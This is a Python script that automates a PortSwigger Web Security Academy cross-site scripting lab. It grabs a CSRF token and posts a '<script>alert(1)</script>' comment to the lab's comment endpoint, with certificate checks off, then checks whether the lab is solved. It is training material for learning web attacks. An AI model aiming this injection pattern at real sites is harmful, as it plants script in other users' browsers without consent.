import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
# author: 0xyf


class XSS2:
    def __init__(self):
        self.lab_id = "0a43004f030c27ad803bad700020003f"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.csrf_url = f"{self.url}/post?postId=6"
        self.vuln_url = f"{self.url}/post/comment"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def get_csrf_token(self):
        r = requests.get(f"{self.csrf_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, data):
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            cookies=self.cookies,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def stored_xss(self):
        self.get_csrf_token()
        payload = "<script>alert(1)</script>"
        data = {
            "csrf": self.csrf_token,
            "postId": "6",
            "comment": payload,
            "name": "0xyf",
            "email": "0xyf@0xyf.local",
            "website": "https://yufongg.github.ioo",
        }
        r = self.execute_request(data)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.stored_xss()
        self.check_solved()


def main():
    XSS2().solve()


if __name__ == "__main__":
    main()
